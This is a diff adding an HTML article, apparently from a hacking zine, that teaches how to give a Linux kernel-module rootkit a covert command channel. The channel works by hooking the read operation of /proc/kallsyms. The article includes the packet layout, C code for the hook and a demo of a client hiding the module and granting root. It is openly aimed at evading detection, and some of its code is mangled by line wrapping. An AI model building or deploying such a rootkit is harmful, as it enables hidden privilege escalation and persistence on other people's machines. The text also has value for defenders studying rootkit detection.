@@ -1,0 +1,451 @@
+<html>
+<head>
+<title>ProcFS hooking: A new way of communication for LKM rootkits</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠺⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⣀⠀⠀⠀⡶⣄⠀⠀⠀⠀⠀⠀⠀⠀⡰⠁⡀⢧⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⢠⢊⠤⠠⢄⠑⣮⠒⠇⠈⠳⢄⠀⠀⠀⠀⠀⡰⠁⠀⠁⢸⠀⠀⠀⠀⠀⣿⣧⣰⣿⡆⣀⢸⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⡰⠋⠀⠀⠈⢿⡏⠀⠀⠈⡆⣿⠀⠀⠀⡀⠀⠱⣄⠀⢠⠖⠓⠒⠲⠤⢤⡀⠀⠀⠀⠀⣿⡿⠿⣻⣿⣿⣾⣿⣷⡀⠀⣀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢘⠀⠀⠀⠐⢯⣿⢧⠀⠀⢠⡷⠿⡤⠆⠀⠁⠀⣀⠜⢙⣯⣐⣒⠲⠶⠶⢶⣿⠀⠀⠀⡴⠋⢠⣾⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⢖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣀⣀⠼⢤⠖⠂⠐⢺⣿⠛⠦⠒⠉⠀⠐⢳⡏⠀⠈⠉⢀⣠⣾⠿⠧⣸⣄⣉⡉⢘⡿⠛⠉⢹⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠰⠋⠀⠀⢀⡈⣆⠀⠀⢸⣿⠄⠀⠀⠀⠀⠀⢸⡧⢤⡴⠞⢫⠷⡄⠀⠀⡀⠀⠀⠀⠀⠀⠀⢀⣾⠀⠀⠀⠈⢻⢿⣿⣿⣷⣽⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠃⠀⠀⠀⢸⣿⠊⠳⣄⣸⣿⠀⠀⠀⣀⠄⠀⠀⢑⣾⣶⣾⣧⣥⣼⣮⡁⠀⠈⠉⠲⣤⣤⣾⣿⣿⣆⠀⢀⡤⠋⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢰⡀⠀⣀⣴⣹⠃⠀⠀⠀⠁⠀⠀⠀⣏⣀⣤⢤⣧⣯⢱⡀⠙⣿⣿⣿⣿⡄⠀⠀⠀⠈⢻⡛⣿⣿⣟⠉⢁⣠⠶⢿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠈⠳⡎⠁⠀⠹⡀⠀⠀⠀⡦⣐⡤⠒⠉⠀⠈⢱⠟⠈⢀⣷⠀⢸⣿⡇⠨⣻⠀⠀⠀⠀⠀⣿⣿⠟⠋⠉⠙⠳⣄⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⡀⠀⠀⠀⠀⠀⣴⢄⠀⠀⠀⠀
+⠀⠀⠘⠢⣀⠀⡎⠒⠤⣬⣗⠈⠑⠦⣀⣀⣀⡞⢀⣸⡟⠉⣧⢀⣿⣷⣶⣿⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠈⠳⣴⡃⢿⢿⣿⣿⡏⠹⣿⣿⡋⠸⣦⠤⢤⣀⡀⡃⠀⣱⡄⣠⡄
+⠀⠀⠀⠀⠀⠉⣁⣠⢤⢻⡿⣿⣿⣿⣿⡿⢿⣿⡿⠋⠀⡜⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⢠⠎⠙⠓⠤⣿⢻⣧⡾⠿⣿⣿⣷⡿⡦⠚⠀⠙⣏⠁⠀⢹⠁⠀
+⠀⠀⠀⠶⣏⠁⠀⠀⡇⠈⡏⣹⠙⠛⠣⣆⡞⣉⠀⠀⠘⠀⢠⣾⡿⠛⢻⠏⠀⠀⠀⠀⢸⣿⣧⠀⠀⢠⣴⣤⡐⠁⠀⠀⠀⠀⠀⠀⠀⠀⣠⣀⠈⢻⡧⣹⠂⠀⢀⣗⠀⢀⡮⠓⠶
+⠀⠀⠀⠀⠈⠑⠢⣠⡁⢠⢁⠃⠀⠀⢠⣿⡿⠉⠉⠳⢶⣶⣿⠿⣷⡶⡜⠀⠀⠀⠀⢀⠞⣿⣼⠀⠀⢸⣏⣽⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⡆⡜⡧⣀⢀⠤⡾⠃⣠⠟⢋⡔⠁
+⠀⠀⠀⠀⠀⠀⠀⣤⠓⠾⡼⠀⠀⠀⣸⣿⡇⠀⠀⠀⠈⠷⠁⠀⠘⠀⠀⠀⠀⠀⣠⠋⠀⠘⣿⣧⠀⠀⢿⣛⣿⣿⣧⣄⠀⠀⠀⠀⠀⠀⠀⠈⠀⡰⠋⠌⠉⠀⣁⡴⠡⠔⠋⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⡇⠀⠀⢀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠉⣦⠀⠀⠈⢿⡄⠀⠀⠙⠿⠯⠿⢷⣷⣶⣦⣴⣶⣶⣤⡴⢾⡀⠀⠀⠀⡼⠋⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⡇⠀⠀⣼⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠚⠉⣄⠀⠈⠃⠀⠀⠀⠹⣄⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣹⣿⣷⣌⣀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢠⠢⢄⡀⣠⠊⣽⠀⢳⠀⢠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⡃⠀⠀⠈⠓⠤⣀⠀⠀⠀⢀⡹⣷⣤⣀⣀⣀⡀⣀⣀⢼⠁⠈⠿⣿⣿⣿⠿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢣⠀⠌⣧⠤⠿⠤⣠⠃⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠃⠈⠲⠄⠀⠀⠀⠀⠉⠐⠂⠉⣿⣿⣷⣿⣿⠀⠀⠀⠀⠐⢤⣀⠀⠈⣙⠿⠒⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠣⡀⠀⠀⠁⠀⢟⣴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⢸⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⠋⠉⠉⠈⠙⢻⡶⠤⣀⠤⢌⡫⠔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠙⣝⢤⡤⠊⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⡰⠃⣸⣆⠈⠒⠤⣄⡀⠀⠀⠀⠀⣠⠏⠀⠀⠀⠀⠀⠀⢸⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢈⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢁⡼⡿⠈⠑⠠⢄⣀⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⡀⠀⠀⠀⢠⠾⠶⠤⢤⠤⢤⣽⣚⣉⣠⠤⠂⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⠎⢀⠣⠀⠀⠀⠐⠀⠄⠀⡜⠀⣰⡃⡜⠀⠀⣠⠾⠿⠒⠂⠈⠁⠀⠀⢸⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⡈⠸⠈⣄⡤⢟⣢⣄⡐⢠⣨⣀⣞⡷⣏⡷⣠⠔⠁⠀⠀⠀⠀⠀⠀⠀⠈⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⠀⠀⠀⠘⣿⠁⠉⠍⢻⡟⠛⢿⣿⡛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢚⣄⡠⢷⣖⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢏⢰⠋⠉⠙⣿⢠⠋⠈⠳⣿⡞⠉⠻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡎⠀⢱⣀⡹⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠈⠿⢤⣀⡼⠟⠿⢦⣀⣴⠛⠓⣤⣴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠉⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+    .-------------------------------------------------------------.
+    | ProcFS hooking: A new way of communication for LKM rootkits |
+    '-------------------------------------------------------------'
+    ~ lil.skelly
+
+--[ Introduction ]------------------------------------------------------------
+
+Kernel development can offer valuable lessons for system security.
+I recently got started with kernel development myself, by creating my own
+loadable kernel module rootkit (aka LKM rootkit).
+
+As I was researching techniques used by other rootkits, I stumbled upon
+something very interesting.
+
+Most, if not all of these rootkits, seemed to hook the kill system call
+in order to intercept signals sent to processes.  This was done to provide
+an interface to the threat actor to communicate with the rootkit, making
+it execute different commands at will.
+
+And sure for simple research projects that's completely fine, but my
+curiosity wanted to find another way and perhaps a better one.
+
+You are in for a treat (I hope) as I will guide you through my
+idea on how to make the communication with your rootkit more stealthy,
+and secure.
+
+--[ "But what's wrong with kill signals" ]------------------------------------
+
+Well there is 1 main problem with this approach:
+* Rootkits can only use signals ranging from 32 to 64
+(range of process specific signals).
+And that makes them very easily detectable.
+
+* "And what are you going to do about it ¿¿¿"
+Well hold your seats because the next part is awesome!
+
+
+--[ Introduction to the procfs ]----------------------------------------------
+
+The proc file system (aka procfs) is basically used as an interface to
+internal data structures in the kernel.  It is used to obtain information
+about processes as well as other system information and to change some
+kernel parameters at runtime (sysctl).  For our purpose we will only focus
+in the *system information* part.
+
+Every entry in the proc file system provides information from the kernel.
+It serves as a middleman for user-kernel (and back) communication.
+
+Take for example /proc/module which gives information about all the modules
+that are currently part of the kernel.  A user does not have access to
+kernel space information and that's where procfs come in to play!  The user
+can *simply* (subjective ;) create a procfs entry to do the job for him!
+
+"Okay and how does that have anything to do wi-"
+
+To understand why I'm telling you all this we need to go just a tad
+bit deeper.  And by a tad bit I mean into how a procfs entry is actually
+represented in the kernel.
+
+--[ Inside a procfs entry ]---------------------------------------------------
+
+    struct proc_dir_entry {
+        atomic_t in_use;
+        refcount_t refcnt;
+        struct list_head pde_openers;
+
+        spinlock_t pde_unload_lock;
+        struct completion *pde_unload_completion;
+        const struct inode_operations *proc_iops;
+        union {
+            const struct proc_ops *proc_ops;
+            const struct file_operations *proc_dir_ops;
+        };
+        const struct dentry_operations *proc_dops;
+        union {
+            const struct seq_operations *seq_ops;
+            int (*single_show)(struct seq_file *, void *);
+        };
+        proc_write_t write;
+        void *data;
+        unsigned int state_size;
+        unsigned int low_ino;
+        nlink_t nlink;
+        kuid_t uid;
+        kgid_t gid;
+        loff_t size;
+        struct proc_dir_entry *parent;
+        struct rb_root subdir;
+        struct rb_node subdir_node;
+        char *name;
+        umode_t mode;
+        u8 flags;
+        u8 namelen;
+        char inline_name[];
+    };
+
+This structure holds vital information about the entry.  One very important
+piece of information to us is the contained `proc_ops` structure.
+
+    struct proc_ops {
+        unsigned int proc_flags;
+        int (*proc_open)(
+            struct inode *,
+            struct file *
+        );
+        ssize_t (*proc_read)(
+            struct file *,
+            char __user *,
+            size_t,
+            loff_t *
+        );
+        ssize_t (*proc_read_iter)(
+            struct kiocb *,
+            struct iov_iter *
+        );
+    };
+
+`proc_ops` define how specific operations in the procfs entry should be
+handled.  It basically contains function pointers to various operations
+of that entry like read, write and more.
+We are getting there . . .
+
+--[ The idea ]----------------------------------------------------------------
+
+The idea is to hook an operation of a specific entry to communicate with
+our module.  Thankfully for us, there are a lot of entries to choose from so
+every implementation will likely vary but the generic idea remains the same.
+
+I chose to hook the read operation of the /proc/kallsyms entry.
+It's read operation is defined as the function seq_read,
+the read method for sequential files.
+
+--[ "But why /proc/kallsyms ???" ]--------------------------------------------
+
+The /proc/kallsyms file is a virtual file
+provided by the Linux kernel.  It contains the symbol table used by the
+kernel, which includes both function/variable names.  These symbols are
+crucial for gaining information about the kernel and are especially useful
+during module developing/debugging.
+
+To sum up, we are using a trusted procfs entry as a front to communicate
+under the radar with our rootkit We can write our commands into the buffer
+which we will then pass to the read function (which ends up calling our
+hooked seq_read).
+
+But one can view the contents of that buffer at any time, so we have to
+obfuscate them a little instead of just passing give-me-root.
+
+--[ Making the packet ]-------------------------------------------------------
+
+The idea was to translate the commands into single byte values, followed by
+some random junk.  There are only 2^8 possible values for a byte meaning
+that our hook will most certainly mistake some regular buffer contents
+for a command and accidentally reveal our rootkit.
+
+To overcome this we can use a checksum algorithm. I will not go in depth
+about how checksums work as that is a bit out of our scope for today.
+More specifically, we will use a cycle redundancy check mostly because it
+is both simple and fast to calculate but it is also reliable enough for
+our purposes.
+
+Our buffer contents should look something like this:
+
+    .--------------------------.
+    | CMD | RANDOM BYTES | SUM |
+    '--------------------------'
+
+* For example:
+
+    .-------------------------------.
+    | 0xFA | 0xEADC080 | 0x2CFA3226 |
+    '-------------------------------'
+       '         '           '
+       |         |           |
+       '-&gt; the command       |
+                 |           |
+                 '-&gt; some random bytes
+                             |
+                             '-&gt; CRC-32 Checksum
+
+
+And then we will pass the buffer containing our command to the read syscall
+(which ends up calling our hook):
+
+    read(fd, buffer, sizeof(buffer));
+
+Our job in the kernel side from within the seq_read hook looks something like:
+
+    .---------------------.
+    |0xFA|EADC080|2CFA3226|
+    '---------------------'
+     |___________|    |                     _ YES -&gt; Do your thing
+     |             CRC-32 ---.   .------.  /
+     |                       |-&gt; |EQUAL?| -
+     '-&gt; Calculate checksum -'   '------'  \_ NO  -&gt; Act innocent
+
+
+If they match, execute the appropriate command. If not, act normally.
+
+.-~~ NOTE ~~------------------------------------------------------------------.
+| A basic feature of LKM rootkits is the ability to give root to              |
+| the process issuing the command (commonly using kill). For our approach,    |
+| we must depend on a helper binary (a client) to handle the communication,   |
+| meaning that our LKM will only upgrade the privileges of the client process.|
+| There are other things that require a PID too such as hiding processes etc. |
+| Using kill syscalls is particularly convenient since you can just send      |
+| the signal to that PID, so the kernel module knows exactly what to hide.    |
+'-~~ END ~~-------------------------------------------------------------------'
+
+Thus, we must include an additional field for a PID somewhere in our packet.
+I chose to add it right after the random bytes:
+
+    .--------------------------------.
+    | CMD | RANDOM BYTES | PID | SUM |
+    '--------------------------------'
+
+.-~~ NOTE ~~-------------------------------------------------------------.
+| I also managed to create a function for my LKM which safely upgrades   |
+| the credentials of any arbitrary process given its PID (process ID).   |
+| This is advised against in various kernel documentation, but rules are |
+| made to be broken.                                                     |
+|                                                                        |
+| * See reference [1]                                                    |
+'-~~ END ~~--------------------------------------------------------------'
+
+The PID can be 0 if we are just hiding the module or doing stuff where we do
+not need a PID We can start by defining our commands using a simple `enum`:
+
+    /* example */
+    typedef enum {
+        SIG_HIDE = 0xFA,
+        SIG_ROOT = 0xFB,
+        ...
+    };
+
+We will also need some constants to help with extracting our command packets:
+
+    enum {
+        /* Component sizes */
+        CMD_SIZE = sizeof(char),
+        RAND_BYTES_SIZE = 4 * sizeof(char),
+        PID_SIZE = sizeof(pid_t),
+        CRC_SIZE = sizeof(uint32_t),
+
+        TOTAL_SIZE = CMD_SIZE + RAND_BYTES_SIZE + PID_SIZE + CRC_SIZE,
+
+        /* Offsets */
+        PID_OFFSET = TOTAL_SIZE - (PID_SIZE + CRC_SIZE),
+        CRC_OFFSET = TOTAL_SIZE - CRC_SIZE
+    };
+
+Now that we got some solid foundation to work on we can get started
+on our hook.
+We can see that the definition for our original function (seq_read) is:
+
+    ssize_t seq_read(struct file *, char __user *, size_t, loff_t *);
+
+All we have to do is copy it.
+For those who have worked with syscall hooking before, don't worry.
+We are not hooking a system call so we don't have to bother with
+duplicating our hook to work with the new PT_REGS convention.
+
+--[ Getting a copy of the buffer ]--------------------------------------------
+
+The __user identifier for the buffer argument means that it points to
+a userspace location that may not be mapped into our address space.
+
+Meaning that trying to access/dereference the pointer will either result
+in a seg fault or in junk being read from the address. To overcome this
+the kernel provides us with a couple of functions for copying data from
+and back into userspace.
+
+To overcome this, the kernel provides us with a bunch of functions like
+copy_from_user(), strncpy_from_user(), etc, as well as copy_to_user()
+versions for copying data to and back into userspace.
+
+    static asmlinkage ssize_t hook_seq_read(struct file *file, char __user
+    *buf, size_t size, loff_t *ppos)
+
+        char *kbuf; long error;
+
+        /* packet components */ uint8_t sig; pid_t pid; uint32_t
+        extracted_crc, calculated_crc;
+
+        /* allocate a kernel buffer */
+        kbuf = kmalloc(size, GFP_KERNEL);
+        if (!kbuf) {
+        return orig_seq_read(file, buf, size, ppos); // immediately
+        return the original function on error
+        }
+
+        // copy the user buffer to kernel space (kbuf)
+        error = copy_from_user(kbuf, buf, size);
+        if (error) {
+            kfree(kbuf); return orig_seq_read(file, buf, size, ppos);
+        }
+
+        if (size &lt; TOTAL_SIZE) { // check if we are working with the
+        right amount of data
+            kfree(kbuf);
+            return orig_seq_read(file, buf, size, ppos);
+    }
+    ...
+
+And we can now work with the buffer contents!
+
+--[ Extracting the components ]-----------------------------------------------
+
+Next, we have to extract our command, pid and checksum.  We can use memcpy
+to safely extract the PID and the CRC checksum from our packet.
+
+    sig = (uint8_t)kbuf[0]; // the signal is the first byte memcpy(&pid,
+    kbuf + PID_OFFSET, PID_SIZE); memcpy(&extracted_crc, kbuf +
+    CRC_OFFSET, CRC_SIZE);
+
+--[ Verifying the checksum ]--------------------------------------------------
+
+Now we need to calculate a checksum of the data (CMD + RANDOM JUNK + PID)
+and compare it to the one we previously extracted.  Make sure that the
+client used a CRC-32 implementation using the same polynomial as the one
+in our kernel module.
+
+    calculated_crc = crc32(kbuf, TOTAL_SIZE - CRC_SIZE); if
+    (calculated_crc != extracted_crc) {
+        kfree(kbuf); return orig_seq_read(file, buf, size, ppos);
+    }
+
+--[ Proceed to execute command ]----------------------------------------------
+
+Once the packet is verified, you can execute the appropriate command.
+This might involve hiding a module, upgrading privileges, or any other
+actions relevant to your rootkit's functionality.  It is all up to you.
+
+Just don't forget to cleanup after you complete your job by returning a
+call to the original read function.
+
+.-~~NOTE~~------------------------------------------------------.
+| You can insert your hook however you like :), I chose ftrace. |
+'-~~ END ~~-----------------------------------------------------'
+
+
+* Demonstration
+
+
+.-----------------------------------------------------------.
+|    vagrant@ubuntu-bionic:~/basilisk/src$ ./client         |
+|                                                           |
+|    Usage: ./client &lt;cmd&gt; [pid]                            |
+|                                                           |
+|    vagrant@ubuntu-bionic:~/basilisk/src$ ./client god  &lt;--|-------.
+|                                                           |       |
+|    =&gt; Command: FF 3D EF 2C 12 00 00 00 00 18 89 28 2E     |       |
+|    -&gt; Opened fd to /proc/kallsyms                         |       |
+|    =&gt; Sent command to LKM                                 |       |
+|                                                           |       |
+|    vagrant@ubuntu-bionic:~/basilisk/src$ whoami           |       |
+|                                                           |       |
+|    vagrant                                                |       |
+|                                                           |       |
+|    vagrant@ubuntu-bionic:~/basilisk/src$ ./client root &lt;--|-------|-.
+|                                                           |       | |
+|    =&gt; Command: BA 94 50 6B 12 94 0B 00 00 78 AF 38 F5     |       | |
+|    -&gt; Opened fd to /proc/kallsyms                         |       | |
+|    =&gt; Sent command to LKM                                 |       | |
+|                                                           |       | |
+|    vagrant@ubuntu-bionic:~/basilisk/src$ whoami           |       | |
+|                                                           |       | |
+|    root                                                   |       | |
+'-----------------------------------------------------------'       | |
+                                                                    | |
+.-------------------------------------------------------------------|-|-.
+| vagrant@ubuntu-bionic:~$ sudo dmesg -w                            | | |
+| [  217.415492] basilisk: loading out-of-tree module taints kernel.| | |
+| [  217.438964] basilisk: loaded                                   |-|-|--- ./client god
+| [  233.345662] basilisk: hiding kernel module     &lt;--.------------' | |
+| [  233.345680] basilisk: protecting kernel module &lt;--'              | |
+|                                                                     |-|--- ./client root
+| [  247.428801] basilisk: giving root . . .        &lt;-----------------' |
+'-----------------------------------------------------------------------'
+
+--[ Conclusion ]--------------------------------------------------------------
+
+Using standard procfs operations for communicating with a rootkit allows
+for a more discreet method than traditional signal-based communication.
+By utilizing this method you can make your rootkit's communication harder
+to detect and more flexible.
+
+--[ The END ]-----------------------------------------------------------------
+
+That is all for today, I hope you found this technique as exciting as I
+did and that you learnt a thing or two along the way.  Kernel development
+might sometimes seem scary--and it is, but never give up.  Stay curious,
+stay determined, and never stop hacking!
+
+I want to thank everybody from the tmp.out and rootSYN communities.
+
+--[ Special thanks ]----------------------------------------------------------
+
+- richinseattle, ceazar, DeLuks, roddux, sblip, gren, retr0id
+
+--[ References ]--------------------------------------------------------------
+
+.--------------------------------------------------------------------------------------------------------------------.
+* https://elixir.bootlin.com/linux/v6.10.5/source                                                                    *
+* https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/Documentation/security/credentials.rst [1] *
+* https://xcellerator.github.io/ * https://man7.org/linux/man-pages/                                                 *
+* https://en.wikipedia.org/wiki/Procfs                                                                               *
+* https://web.mit.edu/freebsd/head/sys/libkern/crc32.c                                                               *
+'--------------------------------------------------------------------------------------------------------------------'
+
+--[ <a href="13.html">PREV</a> | <a href="index.html">HOME</a> | <a href="15.html">NEXT</a> ]--
+
+</pre></div></body>
